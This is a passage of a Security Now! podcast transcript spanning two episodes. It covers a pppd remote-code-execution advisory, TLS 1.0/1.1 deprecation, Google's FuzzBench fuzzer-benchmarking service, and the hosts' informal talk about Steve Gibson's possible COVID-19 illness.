They said:  "We're extremely grateful to all of our volunteers for supporting us in many ways during the past 20 years.  Without you there would be no SETI@home."  They finished:  "We're excited to finish up our original science project, and we look forward to what comes next."  So very, very cool.  I remember running it for a while at some point, just to see what it looked like.  And the concept of a big distributed number-crunching project for what I would regard as a very good cause, it always appealed to me, and I imagine to our listeners, as well.



LEO:  So what's your theory, why they never found any aliens?



STEVE:  Well, the theory is that are some bad aliens.



LEO:  Oh, no.  They're hiding the good aliens?



STEVE:  Yeah.  The good...



LEO:  They're sneaking around?



STEVE:  Exactly.  It turns out it's better to be dark and not  let your emanations, you know, all of your episodes of "I Love Lucy" go streaming out into the void in perpetuity.



LEO:  Well, that was the premise of the three-body problem, right, is don't contact them.  That's just asking for trouble.



STEVE:  Yeah.  It may not be a good idea.  In fact, the book that I'm now in the second of the trilogy, John I'm sure has probably read it twice already.  I reread the first.  Actually, he did, too.  This is Peter Hamilton's...



LEO:  "Salvation." 



STEVE:  "Salvation" trilogy.  And it actually - it doesn't really give anything away because the way he's writing this, it annoys me.  He's jumping back and forward in time.



LEO:  Oh, I hate that.



STEVE:  I don't - it is so annoying.



LEO:  Movies have been doing that a lot lately.  It drives me nuts.  I think, is this now?  Where are we?



STEVE:  Yeah.  And it's like, do you think it's not interesting enough just to give it to me linearly?  Because that's the way I like to ingest stories.



LEO:  Life happens.



STEVE:  Yeah, and I don't need to know the future in order to find the past because, I mean, he's a great writer.  But anyway, so he's jumping us around.  And so anyway, the point is there are bad aliens.  And you really do want to hide your radio emanations from - anyway.  So I don't know how the story's going to turn out, but it's another one of his fabulous pieces of work.  I mean, it just - he just writes so well.



Okay.  Of importance to, eh, maybe to some of our listeners, but big importance to the Linux distro guys, we have a critical flaw.  And Leo, here's why it's not a big concern.  It's in the Point-to-Point Protocol.



LEO:  Oh, I don't use that, yeah.



STEVE:  Yeah.  Nobody does.  Well, that's not true.  But anyway, so the PPP daemon, if it's there, your system is vulnerable.  So last Thursday US-CERT issued an advisory warning users of a newly discovered and dangerous 17-year-old remote code execution vulnerability affecting the PPP daemon, that's pppd, which is always present, if not usually running, on most Linux-based OSes.  And they note that PPP may be powering the communications of Linux-based embedded networking devices.  There are a few of note at the end of this coverage.



So what is it, PPP?  I would imagine certainly our more mature listeners have seen PPP around.  It is seriously old school.  It was originally used with dial-up modems - remember those? - and later with DSL and some VPN links.  So while it's not in super active use today, it's old and, as with most things on the Internet, never really dies until it is deliberately removed.  Consequently, this won't affect most Linux users.  But it is yet another legacy protocol that has been found to be critically buggy and which, if it were to be in use and were not updated, could open any system at either the client or the server end of a PPP connection to hostile takeover.



Thus the reason it got the 9.8 rating.  I mean, it is remotely exploitable and trivial.  It's a critical stack buffer overflow which was discovered by the IOActive guys due to a logical error in an aspect of it, the Extensible Authentication Protocol (EAP) packet parser which runs on the pppd software.  And as its name suggests, Extensible Authentication Protocol, it's an extension that provides support for additional authentication methods in PPP connections.  The vulnerability is being tracked as CVE-2020-8597, and it carries a CVSS score of a whopping 9.8 because it can be exploited by unauthenticated attackers to remotely execute arbitrary code on any system that has a PPP server or client and take control of them.



However, as I noted, you first need to be actually using PPP for there to be any danger.  So as long as PPP is never used, you're not in danger.  But if it is in use, all an attacker needs to do is send an unsolicited malformed EAP packet to a vulnerable PPP client or server - and they're all vulnerable for the last 17 years until being patched - over a direct serial link, ISDN, Ethernet, SSH, Socket CAT, PPTP, GPRS, or ATM network, that is, you know, any of these transports that support PPP, and all of them do.



And there are many things that do maintain a persistent connection, like old-school ATM machines.  An ATM might have been around for years, be running an older version of Linux to drive its hardware, and has and maintains a persistent connection out to home base over PPP.  And since pppd often runs with high privileges and works in conjunction with kernel drivers, the flaw could allow attackers to potentially execute malicious code with the system or root-level privileges.



So anyway, the advisory says:  "This vulnerability is due to an error in validating the size of the input before copying the supplied data into memory."  In other words, eh.  Classic buffer overflow, "an error in validating the size of the input before copying the supplied data into memory."  Which means the attacker supplies more memory than they are saying or more data than they claim they're supplying.  This thing doesn't catch it, and the attacker is able to write their own data into the system memory and then arrange to give it execution.  The vulnerability is in the logic of the EAP parsing code, and you don't need to be using EAP.  It's always there listening for an EAP request packet.



And they said:  "It is incorrect to assume that pppd is not vulnerable if EAP is not enabled or EAP has not been negotiated by a remote peer using a secret or passphrase."  In other words, it's there, it's listening, and if you've got a PPP client or server, and there's an open connection, you could be in trouble.



The researcher said the Point-to-Point Protocol Daemon versions 2.4.2 through 2.4.8.  Okay.  So 2.4.2, 2.4.8.  In other words, there has not been much action, not surprisingly, over the last 17 years in the Point-to-Point Protocol support.  That's all versions released in the last 17 years.  They are all vulnerable  to this longstanding remote code execution vulnerability.  The Linux distros are updating their PPP daemons.  So for those whose systems are being proactively maintained, this problem will disappear soon.  All the Linuxes are going to get this fixed.



But again, we absolutely know that a great many machines which are serving turnkey embedded functions will not be updated, and will now become subject to targeted attacks.  And if such a machine were on the network of any security-sensitive entity, for example, a major enterprise, maybe something controlling the power grid or a nuclear reactor, this could open any of those otherwise secure systems to attack.  So I hope this comes to the attention of people who are responsible for anything that might be using this point-to-point protocol.



And as I mentioned above, the vulnerable protocol is also present in some turnkey product offerings that people may not be aware of.  Cisco's CallManager is one of them.  TP-LINK products use it.  The OpenWRT Embedded OS uses it, and Synology's products use Point-to-Point Protocol.  Again, it would have to be exposed.  If you're behind a firewall, if you're behind a NAT router, you're probably okay.  So in the unlikely event that something is actually using Point-to-Point Protocol, keep an eye out for an update.  You'll want to apply that.



LEO:  I just checked my default install of Pop!_OS, and PPP and pppd are installed.  I'm sure the daemons aren't started.  That would be unlikely.  But I just uninstalled them, and that's fine.  You know, I just removed them.



STEVE:  Good, yes.  I was going to - that's very...



LEO:  Sudo apt remove PPP, and everything's gone.



STEVE:  Nice.



LEO:  Another way to do it.



STEVE:  Yes.  And I'm sure nobody will miss it because nobody's using it.



LEO:  Yeah.



STEVE:  Okay.  So speaking of deliberately terminating legacy protocols, that's obviously a recurring theme of the podcast also.  It's that this old stuff doesn't die unless you go out and kill it on purpose.  Back in the spring of 2018, so coming up on two years ago, the developers behind all of our major web browsers - Safari, Chrome, Firefox, and Edge - gathered following the release of TLS v1.3 and jointly announced in October of that year their intention to remove support for TLS v1.0 and 1.1 early this year.



So the first stage of this deliberate protocol deprecation began last year, when browsers began labeling sites that were using TLS 1.0 and 1.1 with a "not secure" indicator in the URL address bar and on the lock icon.  This hinted to users that the HTTPS connection was not as secure as they might imagine or hope, since the maximum TLS version a site is offering was not something any end user has control over.  The hope was that users would notice this and complain to websites so that those sites would proactively move to support newer TLS versions, namely 1.2 and 1.3.



So how'd that work out?  Well, today, more than 850,000 websites are still offering the use of protocols no higher than TLS 1 or 1.1.  This includes sites of major banks, governments, news organizations, telecoms, ecommerce stores, and Internet communities.  This according to a recent report published by Netcraft, which is the well-known U.K. technology networking firm.  All of the 850,000 websites do offer HTTPS, but only over versions of TLS that are now regarded to be weak and insecure.  And of course we've been talking about this for the last 12.5 years.  Time flies.  TLS 1.0 and 1.1 have gotten old.  1.0 was released in 1996, and 1.1 was 14 years ago in 2006.



The protocols support the use of, as we know, many weak cryptographic algorithms and are vulnerable to a series of cryptographic attacks that we've carefully described during this podcast's 12-year history, including BEAST, LUCKY 13, SWEET 32,  CRIME, and POODLE.  To varying degrees, these attacks allow attackers to decrypt portions of HTTPS connections and access varying numbers of bits of a user's plaintext web traffic.  None are critical.  But given that we now have far superior alternatives, it really is time to move on.



So to that end, later this month, okay, later this March, I mean, this current month, our web browsers, all of the web browsers intend to switch from showing a hidden warning, which needs to be deliberately accessed to be seen, to showing full-page errors when users access sites over TLS 1.0 or 1.1.  So that should be interesting.  I have a feeling we will be talking about that a few weeks from now because, boy.  That will finally get the attention of the website operators who are just not bothering to update their servers in order to support newer protocols.  That's crazy.  So anyway, stay tuned.  Three weeks from today is March 31st, and this will have happened by then.  I have a feeling it'll be back in the news.



Leo, a couple bits of miscellany.  We talked last week, I just went bonkers raving about that cool Kickstarter project,  SandSara.  I got email.



LEO:  Uh-oh.



STEVE:  "Hi, Steve.  Huge fan of the podcast."



LEO:  Oh, good.  Oh, that's wild.



STEVE:  "Kind of surreal to hear you talk about my project after listening to you talk so much" - oh, and, yeah, I do talk a lot - "over the years."  He says:  "I really appreciate all the nice things you said.  If you ever get to building your own big table and have any questions, don't hesitate to reach out."  Then he says:  "I just upgraded your order to include both the RGB lighting and tempered glass upgrades."  He said:  "I also wanted to do a special offer for your listeners.  Any order that comes through this link will get the RGB upgrade for free."  And he said:  "You can redirect https://grc.sc/sand to that one if you want."  So he already knew about my shortcut that I created for last week's podcast.



And so I immediately switched the link over so that any of our listeners using that would get the benefit of the fact that the guy behind the project is also a Security Now! listener.  And the last time I checked, 17 of our listeners - 3,445 had clicked on the shortcut, 17 of whom decided that, like you and me, Leo, they had to have one.  When I looked this morning to put these notes together, there were still six remaining of the circular birch wood, six of the circular dark walnut, nine of the star in birch, and 22 of the star in dark walnut.  So they are there.  I don't expect they'll be there for a lot longer.  And for anyone using grc.sc/sand, if you use that link, you also get the RGB lighting.  It's a ring of LEDs around the inner perimeter that lights up the sand so you can see it at night.



LEO:  Nice, nice.



STEVE:  So anyway, very big thanks to Ed, and I'm delighted that he's a listener to Security Now!.  What a hoot.



And the last little bit of miscellany, before we talk about Fuzzy Benches, I got a Twitter from - his handle is @freddfarkl, who said, can you make mention of a specific Vitamin C liquid that seems to be so well liked.  You and I were talking about it.  Of course last week I talked about Vitamin D relative to the podcast I did a long time ago.  And we talked about other things that one could do.  Vitamin C is another underappreciated vitamin.  You and Lorrie really like the liquid.  Anyway, so I created a shortcut to take people who are interested to an Amazon page, grc.sc/liquid.  That's the shortcut, grc.sc/liquid.  And that will take you there.  That's... 



LEO:  That one's really good.  I didn't use it because it has sugar in it.  So it's not ketogenic.  I use one called, from Aurora, it's called Mega Liposomal Vitamin C.  I get it at the Vitamin Shoppe.  It's sugar-free.  It's also three grams per serving instead of one.  So it's a little more Vitamin C.  And I know you...



STEVE:  Wait, no, three grams.  Oh, three grams of C.



LEO:  3,000 milligrams, yeah.



STEVE:  And is that for a tablespoon?



LEO:  Yeah, a good amount.



STEVE:  Or is that a teaspoon?  Okay.  So the one you've got onscreen, the one that my shortcut links to...



LEO:  This tastes better because it's got sugar in it.



STEVE:  Yeah, Lorrie likes it a lot.



LEO:  Yeah, I like it a lot.



STEVE:  And that's three bottles.  That's a three-bottle case for that $30-some.  So if you price it out, it ends up being a good deal.  And it certainly is easy to take.



LEO:  Yeah.  I put it in my water, drink it all day.



STEVE:  That's exactly the way to do it because Vitamin C is water soluble.  It doesn't stay in us, unlike Vitamin D that does and, in fact, builds up.  Vitamin C is constantly being processed and eliminated.



LEO:  It's a good idea to drink it, I think you told me this, with a straw because it is acidic, and you don't want to run over your teeth.



STEVE:  I may have mentioned that, or somebody else did.  But yes, that is the case.  There are a couple people whose lips have become a little - they described it as "chapped."



LEO:  Well, I think that's from the Vitamin C.  But I'm saying the ascorbic acid is also bad for your tooth enamel.



STEVE:  Oh, I see, the actual - the lemon flavor.



LEO:  Yeah.  If you're taking pills, it doesn't hit your teeth.  But if you're drinking it, use a straw so it goes past your teeth, down your throat.



STEVE:  Right, right.  Okay.  The Fuzzy Bench.  This was a post on the open source Google blog titled "FuzzBench:  Fuzzer Benchmarking as a Service," which they posted early last week, actually last Monday.  So, okay.  Let's review fuzzing so that we're all on the same page.  I pulled from Wikipedia since they have a nice description of it.  And we've talked about it on this podcast before.



Wikipedia said:  "Fuzzing or fuzz testing is an automated software testing technique" - automated being key - "that involves providing invalid, unexpected, or random data as inputs to a computer program.  The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks.  Typically, fuzzers are used to test programs that take structured inputs.  This structure is specified, for example, in a file format or protocol, and distinguishes valid from invalid input.  An effective fuzzer generates semi-valid inputs that are 'valid enough' in that they are not directly rejected by the parser, but do create unexpected behavior deeper in the program and are 'invalid enough' to expose corner cases that have not yet been properly dealt with." 



So we've talked about this.  I love the idea.  I remember, I was trying to remember, his name is Rick.  He was in Southern California.  There was a security firm whose name I've forgotten, and I haven't heard of them for a long time so maybe they were purchased by someone.  But they had a huge room of PCs running fuzzers on various software.  And as I described it at the time on the podcast, they're all running along, and someone kind of just visually scans the room and makes sure that everything's still running.  Every so often, one of them crashes.



And the fuzzer has been keeping a log of what it's doing and making sure that that gets written to nonvolatile storage before any crash that that data that it is about to send into the app might cause.  So then, when a machine crashes, you look and see what it was that the app under fuzz testing had just been given prior to its crash.  Sometimes you may have to back up a little bit.  If an earlier bit of data destabilized the app, then the subsequent data caused the crash.



But the point is, apps should not crash.  And how many times have you and I noted, Leo, that exploitation begins with something that crashes, and then a really talented hacker rolls their sleeves up, figures out exactly why the crash occurred, and then goes, ah, I know how to execute my own code, rather than have it just go off into the wild and crash.



And so the point is that this isn't a genius coder causing something to crash.  It is an interesting way to uncover bugs in programs.  Rather than having a highly skilled hacker with domain-specific knowledge like of all past vulnerabilities, carefully and methodically poking at something, trying to find things that worked before, fuzzing is sort of like - I guess I would use the analogy of the thousand monkeys, all pounding on typewriters, to see whether any of them might by pure chance hit upon something novel and useful.  Maybe.



So this is another of Google's "working to make the world a better place because they have plenty of money, so why not?"  Last week they posted the explanation, this explanation of their latest initiative.  They said:  "We are excited to launch FuzzBench, a fully automated, open source, free service for evaluating fuzzers.  The goal of FuzzBench is to make it painless to rigorously evaluate fuzzing research and make fuzzing research easier for the community to adopt."



And I don't remember now when it was or what it was, but I do remember that we discussed some research coming from academia where we spent some time talking about the fact that fuzzing is not as easy as just throwing noise at something.  In order to get the largest scope of testing to increase the probability of actually finding something, there were strategies involved.  And so there's actually much more to this than you might just immediately think.



They said:  "Fuzzing is an important bug-finding technique.  At Google, we've found tens of thousands of bugs with fuzzers like libFuzzer and AFL.  There are numerous research papers that either improve upon these tools" - and they cite a bunch of them - "or introduce new techniques" - and they cite those - "for bug finding.



"However," they say, "it's hard to know how well these new tools and techniques generalize on a large set of real-world programs.  Though research normally includes evaluations, these often have shortcomings.  They don't use a large and diverse set of real world benchmarks, or they use few trials, or they use short trials, or they lack statistical tests to illustrate whether findings are in fact significant.  This is understandable since full-scale experiments can be prohibitively expensive for researchers.  For example, a 24-hour, 10-trial, 10-fuzzer, 20-benchmark experiment would require 2,000 CPUs to complete in one day.



"To help solve these issues, the OSS-Fuzz team is launching FuzzBench, a fully automated, open source, free service.  FuzzBench" - I just love saying it.  "FuzzBench provides a framework for painlessly evaluating fuzzers in a reproducible way.  To use FuzzBench, researchers can simply integrate a new fuzzer, and FuzzBench will run an experiment for 24 hours with many trials and real-world benchmarks.  Based on data from this experiment, FuzzBench will produce a report comparing the performance of the fuzzer to others and give insights into the strengths and weaknesses of each fuzzer.  This should allow researchers to focus more of their time on perfecting techniques and less time setting up evaluations and dealing with existing fuzzers."



Leo, I have - which one is it?  Oh, the sample report, two links down.  It's on the middle of page 15 of the show notes.  Very, very interesting sample report to show what this thing produces.



They said:  "Integrating a fuzzer with FuzzBench is simple, as most integrations are less than 50 lines of code."  It's Python based.  "Once a fuzzer is integrated, it can fuzz almost all 250-plus OSS-Fuzz projects out of the box."  And you're scrolling through the projects right now, Leo.  They said:  "We've already integrated 10 fuzzers, including AFL, libFuzzer, Honggfuzz, and several academic projects such as QSYM and Eclipser.



"Reports include statistical tests to give an idea how likely it is that performance differences between fuzzers are simply due to chance, as well as the raw data so researchers can do their own analysis.  Performance is determined by the amount of covered program edges, though we plan on adding crashes as a performance metric.  You can view a sample report here."  And that's that page that's onscreen.



And so, for example, fuzzers, they said, were run against all sorts of well-known code bases.  And I was curious, and I wanted to share them with our listeners.  So cURL, FreeType, JsonCpp, libjpeg, libpcap, libpng, libxml2, OpenSSL, OpenThread, PHP, SQLite3, Vorbis, and the WOFF2 font interpreter.  So real-world libraries which are there.  And so basically somebody with a new fuzzer just sort of interfaces it.  They're estimating about 50 lines of code.  They give you a sample integration so you can see.  And this allows your fuzzer to be driven by their FuzzBench and have it added to a report that already includes all of those existing fuzzers so you can see how you're doing with the design of your own fuzzer.



Under "How to Participate" they said:  "Our goal is to develop FuzzBench with community contributions and input so that it becomes the gold standard for fuzzer evaluation.  We invite members of the fuzzing research community to contribute their fuzzers and techniques, even while they're in development.  Better evaluations will lead to more adoption and greater impact for fuzzing research.  We also encourage contributions of better ideas and techniques for evaluating fuzzers.  Though we have made some progress on this problem, we have not solved it" - meaning generically the fuzzer problem - "and we need the community's help in developing these best practices."



So, yeah, another big tip of the hat to Google for so willingly and usefully giving back to the community, and really to the world.  Although everyone knows that fuzzing is not the end-all solution for hardening our software and making it bulletproof, it inarguably provides another avenue into providing real-world code security.  And as we know, efficient fuzzing is not easy.  It's the province of university academics, and there's still a lot of progress to be made.  So having an open platform for testing and comparing fuzzers side by side only helps academics to test and hone their new ideas.  So bravo to Google.



LEO:  It's cool.



STEVE:  Yeah.



LEO:  It's really cool.  There are, in the test-driven design world, where you write tests for your code, there are techniques you can use, I know the language I like, Racket, and I know LISP has this - where you can generate sample test results.  And it's sort of like reverse fuzzing.  As you're writing your code, you bang on it with tests that have generated a huge number of different samples and see how it comes out.  And as long as every test passes, you're not proving that it will never fail, but you're expanding the universe of possible bugs.



And in fact there's even, as you know, an academic discipline of proving your code.  And there are tools for doing that, to actually write tests that say, well, this is provably accurate code.  It only works in functional programming because only functional programming, you know, takes the same input and produces the same output every single time.



STEVE:  Yup.  Yup.



LEO:  But it's really a great exercise.  And I think ultimately it's a path forward.  It's kind of the opposite end of the fuzzing.  It's a path forward for making reliable code.



STEVE:  Yeah.



LEO:  Yeah, yeah, it's interesting.  Yeah, the fuzzing's the opposite end, where you just - you flail at it until it breaks.



STEVE:  Yeah.  I think the thousand monkeys typing is the perfect visual analogy.  And it's like, well, one of them may crash your program.  And, if so, that's not supposed to happen.  So then you'll see, well, how did you do that?



LEO:  It's cool.  It's really cool.  And if you're a coder, you really want to look at some of these concepts of testing before you write anything, writing the tests.  And then writing tests, there are test tools that let you kind of reverse fuzz before you distribute your code, which is really cool.



STEVE:  Yup.  Typically referred to as "unit tests."



LEO:  Yeah.  Unit tests, another way to put it.  And, boy, I wish I could remember some of these test commands.  But there's somewhere you can just say, here's a range of tests.  Bang on it as hard as you can.  I think, I feel like that's a LISP feature, not a Racket feature.  Racket's a scheme.  Anyway, enough of that.  Enough of that.  Let's wrap it up because you've got some TV to watch, I think.



STEVE:  It's another...



LEO:  Another Tuesday.



STEVE:  Another Tuesday.  You betcha, baby.



LEO:  Steve Gibson hides out at GRC.com.  That's his Fortress of Solitude on the web.  You can find so many great things there, like ShieldsUP! and his Perfect Paper Passwords, all about Vitamin D.  But also his bread and butter, the thing that keeps him alive, which is SpinRite, the world's finest hard drive recovery and maintenance utility.  Pick up a copy there.  Check out SQRL.  That's there, too.  GRC.com.



You can leave questions for Steve at the website, grc.com/feedback.  But he's also on Twitter at @SGgrc, and he takes direct messages, another place to comment or question Steve at @SGgrc.  Steve has 16Kb versions of the show, low-bandwidth versions; 64Kb.  He also has those great transcripts, so that's the only place where you can get a transcript of the show.



We have audio and video at our website, TWiT.tv/sn.  You can watch us do the show live every Tuesday, 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  If you want to watch live, it's at TWiT.tv/live.  There's also a couple of live audio streams there.  And you can get on-demand versions of the show, as I mentioned, TWiT.tv/sn.  Or the best thing to do is subscribe in your favorite podcast application, and that way you'll just get it automatically.  Collect the entire set, all 757.



Thanks, Steve.  We'll see you next week on Security Now!.



STEVE:  Thanks, buddy.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#758

DATE:		March 17, 2020

TITLE:		The SMBGhost Fiasco

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-758.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we take a deep dive into the many repercussions preceding and following last week's Patch Tuesday.  Wouldn't it be nice to have a quiet one for a change?  But first, we look at a nice list of free services being maintained by BleepingComputer's Lawrence Abrams.  We look at a recent report into the state of open source software vulnerabilities, and at new and truly despicable legislation aimed at forcing social media companies to provide "lawful access" to their customers' encrypted content.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here, but he's here by the hair on his chinny chin chin.  He almost fell prey to, he thinks, COVID-19.  Steve's coughing.  He's feeling better.  But he is here, and there's lots to talk about, including the latest Windows Update fiasco.  We'll also talk a little bit about some of the best COVID resources and information you can get.  And then why is open source software buggier than closed source software?  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 758, recorded Tuesday, March 17th, 2020:  The SMBGhost Fiasco.



It's time for Security Now!, the show where we cover everything having to do with your security, including I think this week maybe a little bit of COVID-19.  There he is, the man, the myth, the legend:  Steve Gibson, who we hope lives long and prospers.



STEVE GIBSON:  That's my plan.  I surprised Leo.



LEO:  I was a little worried when you told me the news, yeah.  What happened?



STEVE:  Yeah, I've been very sick this past week.  And that's unusual for me.  The last time I was sick that I'm aware of was March 12th of 2015.



LEO:  That's how rare it is.  He knows the day.



STEVE:  It was determined by someone, I think I must have mentioned it in the transcript.



LEO:  You did.  I remember that.



STEVE:  And so they went back and found it.  And of course we also know that I've never missed a podcast.



LEO:  Never.



STEVE:  Because I've never been on my butt for one.



LEO:  And I remember March 5th, 2014 you said I almost missed this podcast.  I remember that.



STEVE:  Wow, okay.



LEO:  Yeah.  That's how little you get sick.



STEVE:  Exactly.  So the first question you asked is have I been tested.  Unfortunately, you know, that's the natural question to ask, and I would be first in line.  Everyone knows.  At one point I was having so many blood tests during my Vitamin D, natural Vitamin D production, that the phlebotomist who I rode up the elevator with at LabCorp every morning finally turned to me and said, "What the hell's wrong with you?"  The point being that I'm all pro testing.  But the truth is you can't get tested.  I mean, and I'm not really sure except for that it would be interesting to know about the spread of this because this is what's really interesting is what does our next few weeks look like.  For example, if I'm positive, I'm not on anyone's map or anyone's chart.  I have verified that we have community spread in my neighborhood.



LEO:  Oh, wow.



STEVE:  So it exists here.  So for me, the fact that I'm so rarely sick, and the fact that I happened to get sick last week.  So, okay, it could just be pure coincidence.  But the second thing is that this has a different trajectory for me than anything I'm used to.  I mentioned before we began recording...



LEO:  Have you ever had the seasonal flu?  Do you know what that feels like?



STEVE:  I don't know.  I don't get seasonal flu.



LEO:  I think it's rare.  People often get gastroenteritis, the intestinal bug, which is a norovirus, not the seasonal flu, and they call it the flu, or the stomach flu.  But if you had the flu, you would know.  And the only reason - and I've never had it, either.  The only reason I mention that is because I think that that would give you some benchmark for what it would feel like to have this flu.



STEVE:  Yeah.  So I've done a lot of reading and research, wondering what this was.



LEO:  Because there's still plenty of regular flu going around, you know.



STEVE:  Right.  And in fact I was interested to see that, when people are wanting to get the test, what they are first tested for is everything else that we already have lots of tests for, in order to eliminate it being something other than COVID-19.  Only if they're then negative for everything that we know about, then that qualifies them to see if they're positive for COVID-19.



LEO:  That makes sense, yeah.



STEVE:  So there's an elimination screen first, which is exactly what you would want to do, and then you get the real test.  There was some company opened two mobile testing stations, and their locations were kept secret.  But of course nothing is secret.



LEO:  And immediately jammed, yeah.



STEVE:  But in social media someone posted their location, and they were instantly swamped.



LEO:  Which doesn't work because in order to give you the test, which is a laryngeal probe, goes way down...



STEVE:  It's not fun.



LEO:  You cough.  They have to wear all that protective gear, and they have to change it in between each test.  So the only time you're going to get tested in a drive-through testing is if you have an appointment.  They are not equipped to handle people just driving up, saying "Test me."  I understand that.  It's a safety issue.



STEVE:  If there's a laryngeal test, then there are two because the one I'm aware of they stick this Q-tip, like, further up your nose than you knew your...



LEO:  It goes back down into your throat.  Yeah, yeah, yeah, that's right.



STEVE:  Okay, yes, yeah.  So anyway, I don't know.  Someday I will know because the second there's an antibody test - what they're doing right now, they're testing for fragments of the virus's DNA, which they have located.  So they grab that.  They strip it apart.  They amplify it.  They turn the RNA into DNA so that it's able to replicate.  They then make it copy itself several million times so there's enough of it for them to see, and then that they test. 



LEO:  Wow, that's quite a process.  No wonder [crosstalk].



STEVE:  It is, yeah, oh, my god.  And the problem is, it's that the test that we have now, that process requires a whole bunch of intermediate step reagents.  And it's the reagents that we just don't have a stock of.  Nobody was ready for this to happen.  So anyway...



LEO:  Are the reagents specific to COVID-19?  Or are they just generally the same for all tests?



STEVE:  I don't know enough about the spread of tests.  But what I have heard is that that's the shortage, that it's just there isn't...



LEO:  Well, the CDC sent out a nonfunctional reagent at first.  That was part of the problem.



STEVE:  Yeah, exactly.  So the antibody has been identified.  There's a group of 10 scientists, I don't remember where they are, who have demonstrated the antibody deactivating the virus, so they're jumping up and down.  It was published in New Scientist a couple days ago.  So there's lots of progress being made.  The second I can get a test for the antibody, just it won't matter then except to satisfy my own curiosity, I will do so to see whether I did have it.



There were some reports of people getting reinfected, and the medical community thinks that's extremely unlikely.  They were in China.  They said they got better, then they got reinfected.  They're thinking flawed tests in various stages.  But apparently, once you get this, your body responds with its immune response, generates antibodies to deal with it, and then you're better.



And so that's what, to me, that's what feels different about this, is that I'm, like, I mean, I'm still having fitful sleep, and my right eye became incredibly infected late last week.  This began with a tickle in my throat Monday night, a week ago, when I was working on the podcast.  And I thought, hmm.  Now, I still have my tonsils, so they're like hair trigger.  And they're the first indication that some foreigner is trying to get in.  And so it was worse Tuesday morning.  I coughed a couple times during the podcast.  I was self-conscious of it because I was aware I was probably getting sick.



LEO:  Didn't even notice.  I cough all the time, so I didn't even notice.



STEVE:  And of course I mentioned this to Lorrie, and she immediately disinfected the entire house.  She went through medical school, so she understands a lot of this and has been a big help.  We immediately put ourselves into separate bedrooms.  And normally we're, as you know having been around us, we're very touchy-feely.



LEO:  Yeah, it's very cute.



STEVE:  So now we miss each other.



LEO:  I bet you do.  I bet you do.  That would be very hard for me and Lisa, yeah, yeah.



STEVE:  Yeah.  So it'll be interesting to see another data point.  I mean, I desperately don't want her to get sick.  So who knows whether that'll happen or not.  So I don't know.  So the coincidence of, I mean, like almost never getting sick except now.  Oh, what I was going to say was that the trajectory of this feels different.  Normally, if I'm hit by a virus, it's a two- or three-day deal, and I dispatch with it.  You know, thank you, immune system. 



LEO:  You're very healthy, yeah.



STEVE:  I'm never sick.  Even back before Vitamin D in the GRC days where I had 23 people, something would wash through, unfortunately to quote Trump, would wash through the company, and I'd be the lone man standing.  Everyone at one point or another would just be nuked by this thing, and it just wouldn't get me.  Or maybe I'd feel a little something, and then it would go.  So I have a history of...



LEO:  Yeah, me, too.  Are you Type O?



STEVE:  I don't know.  I should know my blood type.  It's weird that I don't.



LEO:  Somewhere I read, probably specious, that people with Type O are less likely to get it than Type A blood.



STEVE:  Huh.



LEO:  But anyway, I don't know if that's...



STEVE:  So anyway, so Lorrie and I are on self-imposed quarantine, like not only from the world, but from each other.  I'm at probably Day 8 of symptom.  I'm sounding much better right now.  I'm really happy with this.  I mean, I've got Kleenex around me, and I've got tea instead of milk-based drink because that's better for phlegm.  Anyway, so I wasn't sure that I was going to be able to do this.  A couple days ago it seemed unlikely.  I took Sunday off, which I never do, just because I just didn't have any steam.  And again, for me, that's sort of the indicator that I'm not over this yet, and that my body is at war with something that's taking it three times its normal length of time so far to deal with.  Normally it just dispatches something very quickly.  This time is different.  So, you know...



LEO:  I'm willing to accept there's a high likelihood that you got it.  And I'm glad you survived it.



STEVE:  It's in the area.  I happened to get sick at this instant in time, which is like, what?  They're very coincidental.  And also it has a different feel.  It feels like this is something my body's never encountered before, so it's taking longer to work up its antibody population and deal with it.  But anyway, so I just thought our listeners might find it interesting.  Not that I'm representative of the population.  I mean, this is...



LEO:  But you're almost 65.  You're going to be 65 when?  Soon; right?



STEVE:  Next Thursday, yeah.



LEO:  Happy Birthday.



STEVE:  Thank you.



LEO:  Yeah.  I'm glad you made it.



STEVE:  And so now I'm just, I mean, it seems so unlikely, if this is COVID, that I didn't already infect Lorrie before I became symptomatic, before we even knew, although we did instantly implement lockdown for ourselves, living together, when we became suspicious of that.  But so that'll be interesting to see.  She just got a pneumonia shot a few weeks before.  So she was thinking maybe that gave her just a little opportunistic boost at a time when it might need, you know.  We don't know.



LEO:  It is the case, if you're older, you should have a pneumonia shot - I had one - and that it is a good thing in this case to have that, that it helps, a little help, little protective, extra protective.



STEVE:  Yeah.  And in general, you know, of course, now we're a day into a much increased lockdown, which I think makes so much sense.  You know, in theory, I was thinking about this, if it had an R naught of one, then nothing would happen.  That is to say, if one person infected one other person, it would just sort of linearly and slowly move through the population.  Measles has an R naught of about 18.  If this had that, it would be an atomic bomb.  I mean, it would just be over.  If you think about the difference between one, nothing happens, and 18, I mean, it would just be an explosion of unbelievable magnitude.  And it's been fun to watch all of the popular press trying to explain exponentiation to the general population.  It's like, you don't understand yet.



LEO:  Have you ever seen a hockey stick?



STEVE:  Well, and the other thing is that I keep reading in the press, I was reading about Orange County just this morning, they were saying there are 17 cases in Orange County.  And I thought, did you actually just write that?  No, there are not.  You don't know about me.  And the point is, unless you've tested everybody, you can't cite any number.  There are 17 people who have been tested were positive.  That you can say.  But you can't say there are 17 cases in Orange County.  Someone gave it to me.  Who knows?



LEO:  And you haven't been able to get tested, so you're not in that number.



STEVE:  Right.



LEO:  Which is ridiculous.  So you've tried to get tested.  And what did your doctor say?  Just we don't have any.



STEVE:  Yeah.  He said no.  He said, "First of all, Steve, we know you.  Nothing knocks you down."  He said, "You sound fine.  You didn't ever..."



LEO:  Oh, he didn't believe you.



